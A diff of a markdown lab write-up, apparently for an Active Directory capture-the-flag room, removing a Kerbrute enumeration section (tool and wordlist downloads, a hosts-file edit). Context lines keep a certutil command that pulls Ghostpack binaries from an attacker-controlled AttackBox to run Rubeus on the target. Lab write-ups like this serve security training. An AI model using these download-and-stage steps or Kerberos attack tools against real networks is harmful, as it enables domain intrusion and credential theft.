@@ -47,24 +47,6 @@ certutil.exe -urlcache -split -f http://<AttackBox_IP>:8000/Ghostpack-CompiledBi
 
 You should then see a request in the http.server logs. Now you can run Rubeus. Luckily, all required .Net Framework packages are already on the host.
 
-### Enumeration w/ Kerbrute
-
-In my opinion, this section has several small problems, so here are the correct steps,
-
-Download everything,
-
-> wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
-> chmod +x kerbrute
-
-> wget https://github.com/Cryilllic/Active-Directory-Wordlists**/raw/refs/heads/master/**User.txt
-
-Fix routing issue,
-
-> file /etc/hosts
-> nano /etc/hosts
-
-now add the line of: `<Target_machine_IP> CONTROLLER.local` to the hosts file, replacing <Target_machine_IP> with its IP.
-
 ## Attacktive Directory
 
 ### Elevating Privileges within the Domain
